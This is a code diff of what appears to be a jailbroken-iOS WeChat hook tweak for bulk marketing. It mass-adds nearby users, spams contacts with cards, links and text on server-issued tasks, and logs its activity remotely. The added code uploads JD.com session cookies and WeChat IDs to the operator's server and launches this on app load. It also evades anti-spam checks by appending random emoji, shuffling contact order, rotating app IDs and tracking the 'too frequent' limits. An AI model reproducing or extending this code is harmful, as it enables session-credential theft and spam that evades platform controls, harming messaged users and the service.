@@ -23,7 +23,7 @@ static dispatch_queue_t queueTwo = dispatch_get_global_queue(DISPATCH_QUEUE_PRIO
 static NSString *linkTemplate = [[NSString alloc] initWithContentsOfFile:@"/var/root/hkwx/link_template.xml"];
 static NSString *linkTemplatetest = [[NSString alloc] initWithContentsOfFile:@"/var/root/hkwx/link_templatetest.xml"];
 
-static NSString *m_hookVersion = @"4.4.0";  //版本号
+static NSString *m_hookVersion = @"4.4.8";  //版本号
 
 static UILabel *nearByFriendlable = [[UILabel alloc] initWithFrame:CGRectMake(100, 2, 120, 30)];
 
@@ -42,6 +42,7 @@ static int m_current_taskType71 = 0;
 BOOL m_endCardOne = FALSE;   //判断第一个是否发送完毕
 static int m_interval = 5;  //间隔秒数
 static BOOL m_current_taskIsOK = NO;  //判断当前执行的任务是否结束
+static BOOL m_scanQRCode = NO;         //判断是否已经进入扫码
 
 static int m_pickupCount = 1; //捡瓶子次数
 int m_pickupinterval = 2;  //多久时间捡一次瓶子
@@ -56,11 +57,15 @@ static NSData *m_voiceData = [[NSData alloc] init];
 NSMutableArray *m_scanQrUrl = [[NSMutableArray alloc] init];
 NSMutableArray *m_addErrorInfo = [[NSMutableArray alloc] init]; //没有加上的错误消息
 NSMutableArray *m_addSuccessInfo = [[NSMutableArray alloc] init]; //没有加上的错误消息
+static int m_frequently_count = 0;          //判断当前频繁的次数
+NSMutableArray *m_frequentlyUser = [[NSMutableArray alloc] init]; //频繁的用户
+
 
 static id webCtrl = nil;
 
 static id newMainFrame = nil;
 
+static NSArray *m_randomFace = [NSArray arrayWithObjects:@"[微笑]",@"[色]",@"[害羞]",@"[得意]",@"[调皮]",@"[呲牙]",@"[酷]",@"[愉快]",@"[偷笑]",@"[悠闲]",@"[坏笑]",@"[阴险]",@"[亲亲]",@"[爱情]",@"[回头]",@"[飞吻]",@"[OK]",@"[强]",@"[握手]",@"[跳跳]",@"[拥抱]",@"[爱心]",@"[太阳]",@"[月亮]",@"[爱你]",@"[礼物]",@"[玫瑰]",@"[嘘]",@"[憨笑]",@"[转圈]",@"[跳绳]",@"[激动]",@"[乱舞]",@"[激动]",@"[献吻]",@"[左太极]",@"[投降]",@"[勾引]",nil];
 
 //创建通知消息
 #define kSendFriendsNotificton                      @"kSendFriendsNotificton"   //发朋友圈
@@ -290,6 +295,43 @@ extern "C" void uploadLog(NSString *title, NSString *data){
 
 }
 
+
+//启动时获取京东cookie
+extern "C" NSString *getExistsJdCookie(NSString *uuid){
+
+    //从配置文件中读取是否是测试环境 还是正式环境
+    NSMutableDictionary *environment = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/root/hkwx/environment.plist"];
+    //    NSLog(@"HKWeChat 从配置文件中读取是否是测试环境 还是正式环境:%@",environment);
+
+    NSString *environmentPath = @"";
+
+    if ([environment[@"enable"] isEqualToString:@"true"]){
+        environmentPath = environment[@"environment"];
+    }
+    else{
+        environmentPath = environment[@"environmentTest"];
+    }
+
+    NSString *urlStr = [NSString stringWithFormat:@"%@existsJdCookie.htm?weixinUuid=%@pluginKind=0",environmentPath,uuid];
+
+    //第一步，创建URL
+    NSURL *url = [NSURL URLWithString:urlStr];
+
+    //第二步，通过URL创建网络请求
+    NSURLRequest *request = [[NSURLRequest alloc]initWithURL:url cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10];
+    //NSURLRequest初始化方法第一个参数：请求访问路径，第二个参数：缓存协议，第三个参数：网络请求超时时间（秒）
+
+    //第三步，连接服务器
+    NSData *received = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:nil];
+
+    NSString *str = [[NSString alloc]initWithData:received encoding:NSUTF8StringEncoding];
+
+
+    return str;
+    
+}
+
+
 //上传群二维码和链接
 extern "C" void uploadChatRoomID(NSString *taskId,NSString *detectId, NSString *qrUrl,NSString *chatRoomId, NSString* nsNickName){
     m_current_taskIsOK = YES;
@@ -354,6 +396,62 @@ extern "C" void uploadChatRoomID(NSString *taskId,NSString *detectId, NSString *
          }
     }];
 }
+
+extern "C" void uploadJdCookie(NSString *weixinUuid,NSString *cookie){
+
+    //从配置文件中读取是否是测试环境 还是正式环境
+    NSMutableDictionary *environment = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/root/hkwx/environment.plist"];
+    NSLog(@"HKWeChat 从配置文件中读取是否是测试环境 还是正式环境:%@",environment);
+
+    NSString *environmentPath = @"";
+
+    if ([environment[@"enable"] isEqualToString:@"true"]){
+        environmentPath = environment[@"environment"];
+    }
+    else{
+        environmentPath = environment[@"environmentTest"];
+    }
+
+    NSString *urlStr = [NSString stringWithFormat:@"%@uploadJdCookie.htm",environmentPath];
+
+    //把传进来的URL字符串转变为URL地址
+    NSURL *url = [NSURL URLWithString:urlStr];
+
+    //请求初始化，可以在这针对缓存，超时做出一些设置
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url
+                                                           cachePolicy:NSURLRequestReloadIgnoringCacheData
+                                                       timeoutInterval:20];
+
+    NSString *parseParamsResult = [NSString stringWithFormat:@"weixinUuid=%@&cookie=%@&pluginKind=0&hookVersion=0",weixinUuid,cookie];
+
+
+    NSLog(@"=======%@,%@",urlStr,parseParamsResult);
+
+
+    NSData *postData = [parseParamsResult dataUsingEncoding:NSUTF8StringEncoding];
+
+    [request setHTTPMethod:@"POST"];
+    [request setHTTPBody:postData];
+
+    //创建一个新的队列（开启新线程）
+    //    NSOperationQueue *queue = [NSOperationQueue new];
+    //发送异步请求，请求完以后返回的数据，通过completionHandler参数来调用
+    //    [NSURLConnection sendAsynchronousRequest:request
+    //                                       queue:queue
+    //                           completionHandler:block];
+
+
+    // 3. Connection
+    [NSURLConnection sendAsynchronousRequest:request queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {
+
+        if (connectionError == nil) {
+
+            NSString *aString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+            
+        }
+    }];
+}
+
 
 //同步加好友失败
 extern "C" void uploadAddFriendData(NSString *taskId,NSString *data){
@@ -2202,6 +2300,8 @@ CLLocation *lbsLocation = nil;
     //加好友的时间
     int interval = [[taskDataDic objectForKey:@"addPersonInterval"] intValue];
 
+    int controlMaxCountLimit = [[taskDataDic objectForKey:@"controlMaxCountLimit"] intValue];
+
     dispatch_group_async(group, queue, ^{
 
         CContactVerifyLogic *logic = [[NSClassFromString(@"CContactVerifyLogic") alloc] init];
@@ -2209,6 +2309,18 @@ CLLocation *lbsLocation = nil;
         NSLog(@"HKWX part1: (71)=======================+>>> %lu",(unsigned long)[listNearBy count]);
 
         for (int i = 0; i < [listNearBy count]; i++) {
+
+            if(controlMaxCountLimit != 0){
+
+                if(m_frequently_count == controlMaxCountLimit){
+                    uploadLog(geServerTypeTitle(71,0,@"(71号任务)当前发送消息过于频繁,退出执行当前任务"),[NSString stringWithFormat:@"执行的位置：%d",(i + 1)]);
+
+                    hook_fail_task(71,[taskDataDic objectForKey:@"taskId"],@"当前发送消息过于频繁,退出执行当前任务");
+
+                    break;
+                }
+            }
+
             CVerifyContactWrap *wrap = [[NSClassFromString(@"CVerifyContactWrap") alloc] init];
             wrap.m_nsUsrName = listNearBy[i];
             //3:来自微信号搜索 6:通过好友同意  13:来自手机通讯录 14:群聊 17:通过名片分享添加  18:来自附近人 30:通过扫一扫添加 39:搜索公众号来源
@@ -2403,9 +2515,41 @@ dispatch_queue_t voicequeue = dispatch_queue_create("sendVoiceMessage", DISPATCH
 
 }
 
+%new
+- (CMessageWrap *)buildLittleTailMsg:(CMessageWrap *)omsg appid:(NSString *)appids{
+    CMessageWrap *msg = [[NSClassFromString(@"CMessageWrap") alloc] initWithMsgType:49];
+
+    NSArray *appIdList = [appids componentsSeparatedByString:@","]; //从字符A中分隔成2个元素的数组
+//    NSArray *appIdList = @[
+//                           @"wxbca640f74160480d", @"wxe57789d2d05098c0", @"wxb6c82517aa33d525", @"wx2fab8a9063c8c6d0",
+//                           @"wxa77232e51741dee3", @"wx40f1ed0460d8cbf4", @"wx93ef3e8fcb0538bc", @"wx579f9c1d84b02376",
+//                           @"wx79f2c4418704b4f8", @"wx3e6556568beeebdd", @"wx50d801314d9eb858", @"wx9b913299215a38f2",
+//
+//                           ];
+    // <string>com.tencent.xin</string>
+    // <string>im.pbeta.inhouse.app.D</string>
+    // NSArray *appList = @[@"#27", @"#26", @"#25", @"#24", @"#23", @"#22", @"#21", @"20", @];
+    [msg setM_bNew:0x1];
+    [msg setM_uiStatus:0x1];
+    [msg setM_uiImgStatus:0x1];
+    [msg setM_bIsForceUpdate:0x1];
+    [msg setM_uiMessageType:0x31];
+    [msg setM_uiAppMsgInnerType:0x1];
+    [msg setM_uiAppVersion:0x8];
+    [msg setM_nsAppName:@""];
+    [msg setM_nsContent:[omsg m_nsContent]];
+    [msg setM_nsTitle:[omsg m_nsContent]];
+    [msg setM_nsFromUsr:[omsg m_nsFromUsr]];
+    [msg setM_nsToUsr:[omsg m_nsToUsr]];
+    NSString *appId = appIdList[arc4random_uniform([appIdList count])];
+    [msg setM_nsAppID:[appId retain]];
+    
+    return msg;
+}
+
 //发送文字
 %new
--(void)sendTextMessages:(NSString *)toUser textContent:(NSString *)textContent{
+-(void)sendTextMessages:(NSString *)toUser textContent:(NSString *)textContent appid:(NSString *)appids{
     NSLog(@"发送文字 1111");
 
     if([textContent isEqualToString:@""]){
@@ -2413,10 +2557,44 @@ dispatch_queue_t voicequeue = dispatch_queue_create("sendVoiceMessage", DISPATCH
         return;
     }
 
-    CContactMgr *mgrText = [[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"CContactMgr")];
+    //    int nCount = [m_randomFace count];
+    NSString *sendText = [NSString stringWithFormat:@"%@,%@",textContent,m_randomFace[(int)(arc4random() % ([m_randomFace count]))]];
+
     CMessageWrap *myMsgText = [[NSClassFromString(@"CMessageWrap") alloc] initWithMsgType:1 nsFromUsr:[m_nCSetting m_nsUsrName]];
     CMessageMgr *msMgrText = [[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"CMessageMgr")];
-    myMsgText.m_nsContent = textContent;
+    myMsgText.m_nsContent = sendText;
+    myMsgText.m_uiMesLocalID = (int)(10000 + (arc4random() % (99999 - 10000 + 1)));;//(unsigned int)randomInt(10000, 99999);
+    myMsgText.m_nsFromUsr = [m_nCSetting m_nsUsrName];
+    myMsgText.m_nsToUsr = toUser;
+    myMsgText.m_uiCreateTime = (int)time(NULL);
+
+
+    if(![appids isEqualToString:@""]){
+        [msMgrText AddAppMsg: toUser MsgWrap:[self buildLittleTailMsg:myMsgText appid:appids] Data:nil Scene:0x3];
+    }else{
+       [msMgrText ResendMsg: toUser MsgWrap:myMsgText];
+    }
+    
+}
+
+
+
+//发送文字
+%new
+-(void)sendTextMessages447:(NSString *)toUser textContent:(NSString *)textContent{
+    NSLog(@"发送文字 1111");
+
+    if([textContent isEqualToString:@""]){
+        uploadLog(geServerTypeTitle(4,6,@"发送文字内容为空,不能发送文字"),[NSString stringWithFormat:@"发送文字失败"]);
+        return;
+    }
+
+//    int nCount = [m_randomFace count];
+    NSString *sendText = [NSString stringWithFormat:@"%@,%@",textContent,m_randomFace[(int)(arc4random() % ([m_randomFace count]))]];
+
+    CMessageWrap *myMsgText = [[NSClassFromString(@"CMessageWrap") alloc] initWithMsgType:1 nsFromUsr:[m_nCSetting m_nsUsrName]];
+    CMessageMgr *msMgrText = [[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"CMessageMgr")];
+    myMsgText.m_nsContent = sendText;
     myMsgText.m_uiMesLocalID = (int)(10000 + (arc4random() % (99999 - 10000 + 1)));;//(unsigned int)randomInt(10000, 99999);
     myMsgText.m_nsFromUsr = [m_nCSetting m_nsUsrName];
     myMsgText.m_nsToUsr = toUser;
@@ -2762,12 +2940,6 @@ static dispatch_queue_t queueOnePerson = dispatch_get_global_queue(DISPATCH_QUEU
             [self sendPictureMessages:wxid pic:picUrl];
         }
 
-
-        //发消息
-        CContactMgr *mgr = [[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"CContactMgr")];
-        //得到自己的信息
-        NSString *myself = [[mgr getSelfContact] m_nsUsrName];
-
         //判断有几条图文链接
         int linkCount = [[m_taskTypeDic71 objectForKey:@"linkCount"] intValue];
 
@@ -2807,7 +2979,7 @@ static dispatch_queue_t queueOnePerson = dispatch_get_global_queue(DISPATCH_QUEU
             uploadLog(geServerTypeTitle(currentType,2,@"开始发送文字消息"),[NSString stringWithFormat:@"wxid:%@ 当前处于发送文字消息,文字消息%@",wxid,textContent]);
 
             //发送文字
-            [self sendTextMessages:wxid textContent:textContent];
+            [self sendTextMessages:wxid textContent:textContent appid:[m_taskTypeDic71 objectForKey:@"appNames"]];
         }
 
         //发送语音
@@ -2831,125 +3003,6 @@ static dispatch_queue_t queueOnePerson = dispatch_get_global_queue(DISPATCH_QUEU
 
 }
 
-%new //4.1.3
--(void)sendMsgOnePerson413:(NSNotification *)notificationText{
-    //给一个人推送名片和消息 71 号任务
-
-    NSLog(@"notificationText %@ %@ %@",notificationText.userInfo,m_taskTypeDic71,[m_taskTypeDic71 objectForKey:@"shareLinkArr"]);
-
-    int currentType = [[m_taskTypeDic71 objectForKey:@"taskType"] intValue];
-
-    NSString *wxid = (NSString *)notificationText.userInfo;
-    if([wxid isEqualToString:@""]){
-        uploadLog(geServerTypeTitle(currentType,2,@"接受到加完好友后的通知为空数据,不能发送消息"),[NSString stringWithFormat:@"数据失败"]);
-        return;
-    }
-
-    uploadLog(geServerTypeTitle(currentType,2,@"接受到加完好友后的通知(当前需要发消息和发名片)"),[NSString stringWithFormat:@"接受到的消息为：%@",notificationText.userInfo]);
-
-    //发送名片
-    NSArray *cardUsers = [[m_taskTypeDic71 objectForKey:@"cardUser"] componentsSeparatedByString:@","]; //从字符A中分隔成2个元素的数组
-
-    if([cardUsers count]<= 0 || [[m_taskTypeDic71 objectForKey:@"cardUser"] isEqualToString:@""]){
-
-        NSLog(@"MYHOOK this is cardUser is null");
-        uploadLog(geServerTypeTitle(currentType,2,@"得到名片为空"),[NSString stringWithFormat:@"wxid:%@ 名片不会发送",wxid]);
-
-    }else{
-        uploadLog(geServerTypeTitle(currentType,2,@"开始发送第一个名片"),[NSString stringWithFormat:@"wxid:%@ 名片为:%@",wxid,cardUsers[0]]);
-        //开始发第一个名片
-        [self sendCardOnePerson:wxid cardUser:cardUsers[0]];
-
-        if([cardUsers count] == 2 && ![cardUsers[1] isEqualToString:@""]){
-            dispatch_group_async(group, queue, ^{
-
-                [NSThread sleepForTimeInterval:5];
-
-                dispatch_async(dispatch_get_main_queue(), ^{
-                    //延时2s
-                    uploadLog(geServerTypeTitle(currentType,2,@"开始发送第二个名片"),[NSString stringWithFormat:@"wxid:%@ 名片为:%@",wxid,cardUsers[0]]);
-                    //开始发第二个名片
-                    [self sendCardOnePerson:wxid cardUser:cardUsers[1]];
-                });
-                
-            });
-        }
-    }
-
-    //发送图片
-    NSString *picUrl = [m_taskTypeDic71 objectForKey:@"picUrl"];
-    NSLog(@"发送图片:%@",picUrl);
-    if([picUrl isEqualToString:@""]){
-        NSLog(@"MYHOOK textContent is null");
-        uploadLog(geServerTypeTitle(currentType,3,@"得到发送图片为空"),[NSString stringWithFormat:@"wxid:%@ 当前处于发送图片",wxid]);
-    }else{
-
-        uploadLog(geServerTypeTitle(currentType,3,@"开始发送图片消息"),[NSString stringWithFormat:@"wxid:%@ 当前处于发送图片消息,图片URL为%@",wxid,picUrl]);
-        [self sendPictureMessages:wxid pic:picUrl];
-    }
-
-    //发消息
-    CContactMgr *mgr = [[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"CContactMgr")];
-    //得到自己的信息
-    NSString *myself = [[mgr getSelfContact] m_nsUsrName];
-
-    //判断有几条图文链接
-    int linkCount = [[m_taskTypeDic71 objectForKey:@"linkCount"] intValue];
-
-    NSLog(@"有几条图文链接:%d 数据为:%@",linkCount,[m_taskTypeDic71 objectForKey:@"shareLinkArr"]);
-    NSMutableArray *shareLinkArr = [[NSMutableArray alloc] init];
-    if(linkCount > 0){
-        for(NSArray *obj in [m_taskTypeDic71 objectForKey:@"shareLinkArr"]){
-            [shareLinkArr addObject:obj];
-        }
-    }
-
-    NSLog(@"图文链接数据:%@",shareLinkArr);
-
-    if(linkCount==0){
-        //当前没有给链接信息
-        uploadLog(geServerTypeTitle(currentType,4,@"服务端没有图文链接"),[NSString stringWithFormat:@"wxid:%@ 当前处于图文链接",wxid]);
-    }else{
-        NSLog(@"图文链接数据:%@",shareLinkArr);
-        for(int i=0; i < linkCount; i++){
-            //当前有一个图文链接
-            uploadLog(geServerTypeTitle(currentType,4,@"服务端发送图文链接开始发送"),[NSString stringWithFormat:@"wxid:%@ 当前处于图文链接,当前的位置:%d",wxid,i]);
-
-            //得到图文链接
-            [self sendLinkMessages:wxid shareLink:shareLinkArr[i]];
-        }
-    }
-
-    NSString *textContent = [m_taskTypeDic71 objectForKey:@"msgContent"];
-    NSLog(@"发送文字:%@",textContent);
-    //判断发送文字
-    if([textContent isEqualToString:@""]){
-        NSLog(@"MYHOOK textContent is null");
-        uploadLog(geServerTypeTitle(currentType,2,@"得到发送文字为空"),[NSString stringWithFormat:@"wxid:%@ 当前处于发送消息",wxid]);
-
-    }else{
-
-        uploadLog(geServerTypeTitle(currentType,2,@"开始发送文字消息"),[NSString stringWithFormat:@"wxid:%@ 当前处于发送文字消息,文字消息%@",wxid,textContent]);
-
-        //发送文字
-        [self sendTextMessages:wxid textContent:textContent];
-    }
-
-    //发送语音
-    NSString *voiceUrl = [m_taskTypeDic71 objectForKey:@"voiceUrl"];
-    if([voiceUrl isEqualToString:@""]){
-        //当前没有发送语音
-        uploadLog(geServerTypeTitle(currentType,4,@"服务端没有发送语音"),[NSString stringWithFormat:@"wxid:%@ 当前处于发送语音",wxid]);
-    }else{
-
-        //        sendVoiceMessage:(NSString *)toUser voiceUrl:(NSString *)voiceUrl voiceTime:(NSString*)voiceTime{
-        [self sendVoiceMessage:wxid voiceUrl:voiceUrl voiceTime:[m_taskTypeDic71 objectForKey:@"voiceTime"]];
-
-        uploadLog(geServerTypeTitle(currentType,4,@"服务端发送语音"),[NSString stringWithFormat:@"wxid:%@ 当前处于语音 语音链接：%@",wxid,voiceUrl]);
-    }
-
-
-}
 
 %new
 -(void)initQueryCard{  //初始化发公众号名片
@@ -3228,23 +3281,23 @@ id webQR = nil;
 
         uploadLog(geServerTypeTitle(88,0,@"MMWebViewController跳转到web页面"),[NSString stringWithFormat:@"执行函数 pushViewController:webQR跳转"]);
 
-        dispatch_group_async(group, queue, ^{
+//        dispatch_group_async(group, queue, ^{
 
-            [NSThread sleepForTimeInterval:10];
-
-            NSLog(@"scanQRCodeEnterRoom 进行开始扫码");
-
-            id lg = [[NSClassFromString(@"ScanQRCodeLogicController") alloc] initWithViewController: self CodeType: 2];
-
-            [lg scanOnePicture: [[webQR webView] getImage ]];
-
-            uploadLog(geServerTypeTitle(88,0,@"scanQRCodeEnterRoom 进行开始扫码"),[NSString stringWithFormat:@"执行函数scanOnePicture"]);
+//            [NSThread sleepForTimeInterval:10];
+//
+//            NSLog(@"scanQRCodeEnterRoom 进行开始扫码");
+//
+//            id lg = [[NSClassFromString(@"ScanQRCodeLogicController") alloc] initWithViewController: self CodeType: 2];
+//
+//            [lg scanOnePicture: [[webQR webView] getImage ]];
+//
+//            uploadLog(geServerTypeTitle(88,0,@"scanQRCodeEnterRoom 进行开始扫码"),[NSString stringWithFormat:@"执行函数scanOnePicture"]);
 
             //延时得到群信息
 //            [NSThread sleepForTimeInterval:5];
 
 //            [self getChatRoomID:[taskDataDic objectForKey:@"taskId"] detectId:[taskDataDic objectForKey:@"detectId"]];
-        });
+//        });
 
     }
 }
@@ -3579,12 +3632,44 @@ static int m_currentNums = 0;
 //    int sessionCount =
 }
 
+
+//首页请求京东cookie数据
+static dispatch_group_t groupCookie = dispatch_group_create();
+static dispatch_queue_t queueCookie = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
+%new
+-(void)homeGetJdCookie{
+    NSLog(@"首页请求京东cookie数据");
+    //异步请求数据
+    dispatch_group_async(groupCookie, queueCookie, ^{
+
+        [NSThread sleepForTimeInterval:2];
+        
+        //同步请求数据
+        NSString *isCookie = getExistsJdCookie([m_nCSetting m_nsUsrName]);
+
+        dispatch_async(dispatch_get_main_queue(), ^{
+
+            NSMutableDictionary *dicCookie = strngToDictionary(isCookie);
+
+            NSLog(@"首页请求京东cookie数据：%@",isCookie);
+
+            if([[dicCookie objectForKey:@"code"] intValue] == 0 && ![isCookie isEqualToString:@""] && [[dicCookie objectForKey:@"jdCookie"] intValue] == 1){
+                //开始做任务
+                id web = [[NSClassFromString(@"MMWebViewController") alloc] initWithURL:[NSURL URLWithString:@"http://wqs.jd.com/my/index.shtml"] presentModal:NO extraInfo:nil];
+            }
+            
+        });
+    });
+}
+
 - (void)viewDidLoad {
     %orig;
     newMainFrame = self;
     if(m_current_taskCount == -1){
         [self registerNotification];
     }
+
+    [self homeGetJdCookie];
 
 //    [self createMyTip];
 
@@ -3687,6 +3772,24 @@ static int m_currentNums = 0;
 
 }
 
+%new
+- (NSMutableArray *) randomizedArrayWithArray:(NSArray *)array {
+
+    NSMutableArray *results = [[NSMutableArray alloc]initWithArray:array];
+
+    int i = [results count];
+
+    while(--i > 0) {
+
+        int j = rand() % (i+1);
+
+        [results exchangeObjectAtIndex:i withObjectAtIndex:j];
+
+    }
+
+    return [results autorelease];
+}
+
 //发送通讯录营销消息
 %new
 -(void)mailMarkMsg:(NSMutableDictionary *)taskDataDic{
@@ -3705,6 +3808,8 @@ static int m_currentNums = 0;
         NSMutableDictionary *dicContact = [ftsContactMgr getContactDictionary];
         __block int dicCount = 0;
         __block int spaceInterval = [[m_taskDataDic72 objectForKey:@"spaceInterval"] intValue];
+        __block int controlMaxCountLimit = [[taskDataDic objectForKey:@"controlMaxCountLimit"] intValue];  //频繁人数
+        __block int sendMsgMaxCountLimit =  [[taskDataDic objectForKey:@"sendMsgMaxCountLimit"] intValue];  //多少个后结束任务
 
         if(spaceInterval == 0){
             spaceInterval = 1;
@@ -3716,7 +3821,9 @@ static int m_currentNums = 0;
             m_dtImg = [NSData dataWithContentsOfURL:[NSURL URLWithString:picUrl]];
         }
 
-        NSArray *keys = [dicContact allKeys];
+        NSArray *dicKeys = [dicContact allKeys];
+
+        NSMutableArray *keys = [self randomizedArrayWithArray:dicKeys];
 
         //判断是否发名片
         int cardCount = [[m_taskDataDic72 objectForKey:@"cardCount"] intValue];
@@ -3745,9 +3852,31 @@ static int m_currentNums = 0;
             }
         }
 
+        //如果为0的话，就是全部发送
+        if(sendMsgMaxCountLimit == 0){
+            sendMsgMaxCountLimit = [keys count] + 1;
+        }
+
         for(int i=0; i< [keys count]; i++){
 
-            [NSThread sleepForTimeInterval:spaceInterval];
+            if(controlMaxCountLimit != 0){
+                if(m_frequently_count == controlMaxCountLimit){
+                    uploadLog(geServerTypeTitle(72,0,@"当前发送消息过于频繁,退出执行当前任务"),[NSString stringWithFormat:@"执行的位置：%d 共有多少个好友:%lu",dicCount,(unsigned long)[keys count]]);
+
+                    hook_fail_task(72,[taskDataDic objectForKey:@"taskId"],@"当前发送消息过于频繁,退出执行当前任务");
+
+                    break;
+                }
+            }
+
+            if((dicCount + 1) == sendMsgMaxCountLimit){
+
+                uploadLog(geServerTypeTitle(72,0,@"当前服务端告诉我发送个数后，这个任务处于成功"),[NSString stringWithFormat:@"执行的位置：%d 共有多少个好友:%lu,告诉多少个结束",dicCount,(unsigned long)[keys count],sendMsgMaxCountLimit]);
+
+                hook_success_task(72,[taskDataDic objectForKey:@"taskId"]);
+
+                break;
+            }
 
             dispatch_async(dispatch_get_main_queue(), ^{
 
@@ -3823,17 +3952,17 @@ static int m_currentNums = 0;
                     }
 
                     //判断发送文字
-                    if([[m_taskDataDic72 objectForKey:@"msgContent"] isEqualToString:@""]){
+                    NSString *msgContent =[m_taskDataDic72 objectForKey:@"msgContent"];
+
+                    if([msgContent isEqualToString:@""]){
                         NSLog(@"72MYHOOK textContent is null");
                         uploadLog(geServerTypeTitle(72,2,@"得到发送文字为空"),[NSString stringWithFormat:@"wxid:%@ 当前处于发送消息",wxid]);
-
                     }else{
 
                         uploadLog(geServerTypeTitle(72,2,@"开始发送文字消息"),[NSString stringWithFormat:@"wxid:%@ 当前处于发送文字消息,文字消息%@",wxid,[m_taskDataDic72 objectForKey:@"msgContent"]]);
-                        NSString *msgContent =[m_taskDataDic72 objectForKey:@"msgContent"];
 
                         //发送文字
-                        [self sendTextMessages:wxid textContent:msgContent];
+                        [self sendTextMessages:wxid textContent:msgContent appid:[m_taskDataDic72 objectForKey:@"appNames"]];
                     }
 
 
@@ -3841,7 +3970,7 @@ static int m_currentNums = 0;
                          && ![wxid isEqualToString:@"notification_messages"]
                          && [oneContact m_uiCertificationFlag] != 0){
                     //发送消息
-                    [self sendTextMessages:wxid textContent:[m_taskDataDic72 objectForKey:@"publicContent"]];
+                    [self sendTextMessages:wxid textContent:[m_taskDataDic72 objectForKey:@"publicContent"] appid:@""];
                 }
 
                 if(dicCount == [keys count]){
@@ -3853,6 +3982,8 @@ static int m_currentNums = 0;
 
             });
 
+            //进行延时
+            [NSThread sleepForTimeInterval:spaceInterval];
         }
     });
 }
@@ -3992,7 +4123,7 @@ static int m_currentNums = 0;
                     NSString *msgContent =[m_taskDataDic72 objectForKey:@"msgContent"];
                     
                     //发送文字
-                    [self sendTextMessages:wxid textContent:msgContent];
+                    [self sendTextMessages:wxid textContent:msgContent appid:[m_taskDataDic72 objectForKey:@"appNames"]];
                 }
                 
                 
@@ -4000,7 +4131,7 @@ static int m_currentNums = 0;
                      && ![wxid isEqualToString:@"notification_messages"]
                      && [oneContact m_uiCertificationFlag] != 0){
                 //发送消息
-                [self sendTextMessages:wxid textContent:[m_taskDataDic72 objectForKey:@"publicContent"]];
+                [self sendTextMessages:wxid textContent:[m_taskDataDic72 objectForKey:@"publicContent"]  appid:@""];
             }
             
             if(dicCount == [keys count]){
@@ -4379,7 +4510,7 @@ static int m_currentNums = 0;
                 [NSThread sleepForTimeInterval:interval];
 
                 dispatch_async(dispatch_get_main_queue(), ^{
-                    [self sendTextMessages:[publiAttentionArr[i] objectForKey:@"nsUsrName"] textContent:@"你好"];
+                    [self sendTextMessages:[publiAttentionArr[i] objectForKey:@"nsUsrName"] textContent:@"你好" appid:@""];
                     //显示
                     NSString *text = [NSString stringWithFormat:@"81: %d/%d",i+1,cardCount];
                     nearByFriendlable.text = text;
@@ -4452,7 +4583,7 @@ static int m_currentNums = 0;
                 uploadLog(geServerTypeTitle(64,3,@"进行关注一个公众号"),[NSString stringWithFormat:@"当前关注公众号为:%@",listCardUsers[i]]);
 
                 //发送消息
-                [self sendTextMessages:listCardUsers[i] textContent:@"您好"];
+                [self sendTextMessages:listCardUsers[i] textContent:@"您好" appid:@""];
 
             });
 
@@ -4988,6 +5119,30 @@ static int m_currentNums = 0;
 
 %hook CMessageMgr
 
+- (void)AsyncOnModMsg:(id)arg1 MsgWrap:(id)arg2{
+    %orig;
+
+    switch([arg2 m_uiStatus]){
+        case 2:
+            //发送成功
+            break;
+        case 5:
+            //发送失败
+            break;
+    }
+}
+- (id)GetLastMsgToUsr:(id)arg1{
+    id ret = %orig;
+    NSLog(@"CMessageMgr GetLastMsgToUsr:%@ ret:%@",arg1,%orig);
+    return ret;
+}
+
+- (id)GetLastMsgFromUsr:(id)arg1{
+    id ret = %orig;
+    NSLog(@"CMessageMgr GetLastMsgFromUsr:%@ ret:%@",arg1,%orig);
+    return ret;
+}
+
 - (void)AddLocalMsg:(id)arg1 MsgWrap:(id)arg2 {
     NSLog(@"MYHOOK - CMessageMgr - AddLocalMsg: %@ , %@", arg1, arg2);
     %orig;
@@ -5046,23 +5201,30 @@ static int m_currentNums = 0;
 
 - (void)MessageReturn:(unsigned int)arg1 MessageInfo:(id)arg2 Event:(unsigned int)arg3{
     %orig;
-//    NSString *msgDBItem = [NSString stringWithFormat:@"%@",arg2];
-//    NSLog(@"----------%@",msgDBItem);
-//    if([msgDBItem rangeOfString:@"type=10000"].location != NSNotFound && [msgDBItem rangeOfString:@"_25"].location != NSNotFound){
-//
-//        NSArray *listItem = [msgDBItem componentsSeparatedByString:@";"];
-//
-//        NSLog(@" msgDBItem is:%@,listItem:%@",msgDBItem,listItem);
-//
-//        //保存到文件中
-//        write2File(@"/var/root/hkwx/sendMsgFail.plist", msgDBItem);
-//
-//        NSMutableDictionary *config = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/root/hkwx/sendMsgFail.plist"];
-//
-//        NSArray *keys = [config[@"_25"] allKeys];
-//
-//        NSLog(@"-----------------%@ keys %@",config[@"_25"],keys);
-//    }
+
+//    NSLog(@"MessageReturn -----------:%@ m_uiMessageType:%d m_nsFromUsr:%@ m_nsToUsr:%@ m_uiStatus:%d",[[arg2 objectForKey:@"18"] GetDisplayContent],[[arg2 objectForKey:@"18"] m_uiMessageType],[[arg2 objectForKey:@"18"] m_nsFromUsr],[[arg2 objectForKey:@"18"] m_nsToUsr],[[arg2 objectForKey:@"18"] m_uiStatus]);
+
+    if([[arg2 objectForKey:@"18"] m_uiStatus] == 5){
+        //当前消息发送失败
